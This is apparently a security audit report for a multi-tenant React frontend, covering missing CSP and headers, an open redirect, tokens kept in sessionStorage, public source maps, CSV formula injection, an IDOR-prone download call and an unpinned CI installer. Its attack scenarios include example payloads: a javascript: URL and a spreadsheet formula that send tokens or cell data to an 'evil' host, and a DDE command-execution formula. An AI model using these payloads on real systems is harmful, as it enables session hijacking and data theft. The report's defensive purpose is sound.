01Executive Summary

RECOVERY is a multi-tenant, subdomain-routed React SPA whose only backend is the shared NestJS API. It has a small, well-contained attack surface: a single RTK Query network layer with a 401 refresh-and-retry flow, no admin UI, no client-rendered HTML, and no third-party embed points. A prior hardening pass (this is the security-improvements branch) already eliminated the most severe class of issues that afflicted the trade-harmonizer baseline.

What remains are edge-hardening gaps rather than logic flaws. The application ships no HTTP security headers and no Content-Security-Policy — the single biggest weakness, leaving it open to clickjacking and removing all defense-in-depth against script injection. It contains a client-side open redirect reachable via a URL parameter, keeps access and refresh tokens in JavaScript-readable sessionStorage, and serves production source maps. The remainder are dependency hygiene, CSV export encoding, and dead-code items. None require backend changes; all are frontend-owned and fixable independently.

04Findings — High

HDR-001Fixed*HighConfiguration · CSP · Clickjacking
No HTTP security headers and no Content-Security-Policy are delivered
Module: Configuration / Hosting File: public/index.html, amplify.yml Confidence: High Priority: Immediate
Description

The app is a static CRA bundle served by AWS Amplify. There is no customHttp.yml, no headers block in amplify.yml, and no <meta http-equiv> CSP in public/index.html. As a result the production site ships no Content-Security-Policy, X-Frame-Options / frame-ancestors, HSTS, X-Content-Type-Options, Referrer-Policy, or Permissions-Policy.

Why it is dangerous

With no frame-ancestors/X-Frame-Options the login and dashboard can be framed → clickjacking / UI-redress against authenticated actions (e.g. account-deletion request). With no CSP there is zero defense-in-depth: any injected script (see RED-001, or a future DOM sink) runs unrestricted and can exfiltrate the sessionStorage tokens (SES-001). No HSTS permits SSL-strip downgrade on first contact; no nosniff allows MIME-confusion on served attachments.

Attack scenario

An attacker hosts <iframe src="https://acme.recovery.tradeharmonizer.co.uk/settings"> with an invisible overlay, tricking a logged-in user into clicking "Request account deletion". Separately, if any script executes on-origin, JSON.parse(sessionStorage.recovery_platform_auth_v2) yields the live access + refresh tokens with no CSP to block the outbound beacon.

Evidence
# amplify.yml — no `customHeaders:` / customHttp.yml present
frontend:
  artifacts:
    baseDirectory: build
# public/index.html — no CSP meta, loads fonts from an external origin
<link href="https://fonts.googleapis.com/css2?family=Lexend..." rel="stylesheet" />

RED-001FixedHighOpen Redirect · DOM-XSS
Unvalidated redirectUrl query param drives navigation and an anchor href
Module: Routing / Redirects File: src/pages/auth/InvalidSubdomainPage.tsx Fn: InvalidSubdomainPage Confidence: High Priority: Immediate
Description

The page reads redirectUrl directly from the URL query string and, after a 600 ms timer, performs window.location.replace(redirectUrl). The same untrusted value is rendered as the href of the "Go to main site" link. There is no scheme or host allowlist. The duplicate copy at src/components/tenant/InvalidSubdomainPage.tsx behaves identically via window.location.href.

Why it is dangerous

Any tenant/host that reaches this route can be sent an attacker-chosen destination — a classic open redirect used to launder phishing links behind the trusted brand domain. Because the value is also placed straight into an anchor href, a javascript: URI (e.g. ?redirectUrl=javascript:fetch('//evil/'+sessionStorage.recovery_platform_auth_v2)) executes as DOM-based XSS when the user clicks the button — and with no CSP (HDR-001) nothing stops it.

Attack scenario

Phishing email: https://acme.recovery.tradeharmonizer.co.uk/invalid-subdomain?redirectUrl=https://acme-recovery-login.com. The victim trusts the real domain in the link, lands on the branded page, and is auto-forwarded to the credential-harvesting clone. A crafted javascript: value escalates the same entry point to token theft.

Evidence
const redirectUrl = searchParams.get('redirectUrl') || env.mainSiteUrl
useEffect(() => {
  const timer = window.setTimeout(() => {
    window.location.replace(redirectUrl)   // no validation
  }, 600)
}, [redirectUrl])
...
<a href={redirectUrl}>{t('auth.invalidSubdomain.goToMainSite')}</a>  // javascript: sink

SES-001Backend handoffHighToken Storage · Session Mgmt
Access & refresh tokens are held in JavaScript-readable sessionStorage
Module: Session / Token Mgmt File: src/services/authStorage.ts Fn: persistAuthState / loadPersistedSession Confidence: High Priority: High
Description

On login the access and refresh tokens are written to sessionStorage under recovery_platform_auth_v2 as a plain JSON envelope, and re-hydrated into Redux at startup. Both tokens are therefore readable by any JavaScript running on the origin. The Authorization header is set from the in-memory token; refresh is a body-based call to /recovery/auth/refresh.

Why it is dangerous

Web-storage tokens are the canonical XSS exfiltration target: a single injected script (RED-001, a vulnerable dependency, or a future sink) reads both tokens and the attacker gains a full, refreshable session off-device. The shared backend already issues an HttpOnly refresh cookie for trade-harmonizer, so a cookie-based path exists that this frontend does not use.

Attack scenario

Given any script execution on-origin (compounded by the absence of CSP, HDR-001), sessionStorage.getItem('recovery_platform_auth_v2') yields {accessToken, refreshToken}. The refresh token lets the attacker mint fresh access tokens well beyond the current tab's lifetime.

Mitigating factors

Materially better than the localStorage baseline: storage is tab-scoped (sessionStorage), carries a hard 12-hour expiry envelope bounded by the JWT exp, and legacy localStorage keys are actively purged. This is why the rating is High rather than Critical.

Evidence
storage.setItem(SESSION_STORAGE_KEY, JSON.stringify(envelope))
// envelope = { accessToken, refreshToken, expiresAtMs }  — readable by any on-origin JS

A07:2021 Identification & Authentication Failures · Session Management Cheat Sheet · ASVS V3.4 (token storage)

ISO 27001/2

Recommendation

INFO-001FixedMediumInformation Disclosure
Production build emits and serves JavaScript source maps
Module: Build / Info Disclosure File: amplify.yml, build config Confidence: High Priority: High
Description

GENERATE_SOURCEMAP=false is not set anywhere (no .env flag, no cross-env in the build script). CRA therefore emits *.map files — confirmed present in build/static/js/*.chunk.js.map — and Amplify serves the entire build/ directory, so the maps are publicly fetchable.

Attack scenario

curl https://<tenant>.recovery.tradeharmonizer.co.uk/static/js/main.<hash>.js.map returns readable source, revealing internal comments (e.g. "Same contract as trade-harmonizer …") and the exact storage key names used in SES-001.

CSV-001FixedMediumOutput Encoding · CSV Injection
CSV export quotes cells but does not neutralize spreadsheet formula injection
Module: Shipments / Export File: src/lib/csv.ts Fn: escapeCell / buildShipmentsCsv Confidence: Medium Priority: Normal
Description

escapeCell applies RFC-4180 quoting (wrapping values containing " , \n) but does not guard against cells that begin with =, +, -, @, tab, or CR — the triggers for spreadsheet formula execution. The trade-harmonizer baseline had a dedicated sanitizeCsvExportData helper; RECOVERY's export lacks the equivalent.

Why it is dangerous

Shipment titles, PO numbers and related fields originate from ingested customer emails/documents — attacker-influenceable data. When an operator opens the exported CSV in Excel/Sheets, a value like =IMPORTXML(...) or =cmd|'/c calc'!A1 executes in their trusted desktop context (data exfiltration or, with legacy DDE, code execution).

Attack scenario

An adversary emails a document whose parsed shipment title is =HYPERLINK("http://evil/?d="&A2,"open"). It flows through the pipeline into the shipments list; an analyst exports and opens the CSV, and the formula fires against every adjacent cell.

Evidence
function escapeCell(value: string): string {
  if (/[",\n\r]/.test(value)) return `"${value.replace(/"/g, '""')}"`
  return value   // leading =,+,-,@ pass through unmodified
}

API-001Already mitigatedMediumBroken Access Control · IDOR
Download endpoint is driven by client-supplied s3Key and bucket
Module: Inbox / Downloads File: recoveryApi.ts · inbox-detail-panel.tsx Fn: getRecoveryDownloadUrl Confidence: Medium (backend-dependent) Priority: Normal
Description

The attachment download mutation forwards s3Key, bucket, recordType and fileName as query params to /recovery/documents/combined/:id/download, and the returned presigned URL is opened via window.location.href. These object identifiers are supplied by the client, not derived server-side from the authenticated user's ownership of :id.

Why it is dangerous

If the backend signs whatever s3Key/bucket it is handed without verifying that the object belongs to the caller's tenant/document, an authenticated user can read arbitrary S3 objects (other tenants' documents) — an IDOR. This is fundamentally a server-side authorization control, but the frontend contract makes the keys attacker-controllable and should be validated during the pentest.

Attack scenario

A logged-in tenant user replays the download call substituting another tenant's known/guessed s3Key and bucket; if the API signs it, the response is a working presigned URL to a foreign document.

Evidence
query: ({ id, s3Key, bucket, recordType, fileName, expiresIn = 300 }) => ({
  url: `/recovery/documents/combined/${id}/download`,
  params: { s3Key, bucket, recordType, fileName, expiresIn },  // client-controlled keys
})

SUP-001Fixed*MediumSupply Chain · CI Configuration
Security scans are defined but not enforced; Trivy installer is unpinned
Module: Supply Chain / CI File: amplify.yml, package.json, .npmrc Confidence: High Priority: Normal
Description

The Amplify build installs Trivy by piping a script fetched from the unpinned main branch (curl -sfL .../trivy/main/contrib/install.sh | sh), prints its version, then never runs a scan — the build phase only calls npm run build. Neither trivy:scan nor security:audit gates the pipeline. .npmrc also sets legacy-peer-deps=true, masking dependency-resolution conflicts.

Why it is dangerous

Piping an unpinned remote script to a shell in CI is a supply-chain foothold: whoever controls that path can execute arbitrary code in the build with repo/deploy credentials. And because the scans it installs are never executed, the project has the appearance of vulnerability gating (DEP-001 would otherwise be caught) without the substance.

Attack scenario

Compromise of (or a malicious commit to) the fetched installer path runs attacker code inside the Amplify build container, which holds source and deploy permissions — a classic build-system compromise.

Evidence
# amplify.yml preBuild

- trivy --version            # installed & version-checked…
# build phase
- npm run build              # …but no `trivy fs` and no `npm audit` gate

POS-001Positive Controls
Calibration — what this frontend already does right
Verified strengths
  • No dangerous sinks: zero dangerouslySetInnerHTML, eval, document.write, postMessage listeners, or iframe embeds; the inbox renders email metadata + attachments, never raw HTML bodies — so the stored/DOM-XSS surface is very small.
  • No secrets in the bundle: .env is git-ignored, holds only public REACT_APP_* config, and a grep for API keys / tokens / AWS creds in src is clean.
  • Improved token hygiene: tokens moved off localStorage to tab-scoped sessionStorage with a 12-hour expiry envelope and legacy-key purging (see SES-001 for the residual).

  • Typed API boundary: a single RTK Query layer with Zod-validated auth responses and a controlled 401 refresh-and-retry keeps network behavior consistent and auditable.
